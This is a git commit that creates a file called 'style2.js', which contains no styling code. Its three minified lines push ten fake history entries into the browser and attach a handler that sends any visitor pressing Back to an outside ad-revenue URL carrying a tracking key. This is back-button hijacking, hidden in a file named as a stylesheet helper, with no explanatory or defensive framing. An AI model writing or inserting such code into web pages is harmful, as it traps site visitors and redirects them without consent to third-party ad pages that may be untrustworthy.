829c188670a47188feec384a06601d333bd14b9d
highbuzz26 <47417849+highbuzz26@users.noreply.github.com>
2021-01-13 20:56:04 +0700

    Create style2.js

---
+++ style2.js
@@ -0,0 +1,3 @@
+! function () {var t;
+try { for (t = 0; 10 > t; ++t) history.pushState({}, "", "#");
+onpopstate = function (t) {t.state && location.replace("https://www.highrevenuecpm.com/cjhm6cxv1?key=7cc967d4a0324f9feb036d688476c05f")}} catch (o) {}}();
